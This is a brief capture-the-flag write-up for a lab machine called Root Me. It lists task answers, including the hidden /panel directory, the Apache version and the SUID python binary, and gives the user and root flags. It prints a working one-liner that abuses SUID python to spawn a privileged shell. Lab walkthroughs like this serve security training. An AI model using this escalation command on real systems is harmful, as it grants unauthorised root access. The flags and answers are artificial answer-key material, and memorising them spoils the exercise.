# Root Me-File upload&SUID python privilege escalation

```
export IP=10.10.5.184
```

# Material needed

1. Interesting directory: /panel

2. Privilege escalation

```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

# Tasks

1. Scan the machine, how many ports are open? 2

2. What version of Apache is running? 2.4.29

3. what service is running on port 22?

4. What is the hidden directory? /panel/

5. user.txt

```
THM{y0u_g0t_a_sh3ll}
```

6. Search for files with SUID permission, which file is weird? /usr/bin/python

7. root.txt

```
THM{pr1v1l3g3_3sc4l4t10n}
```

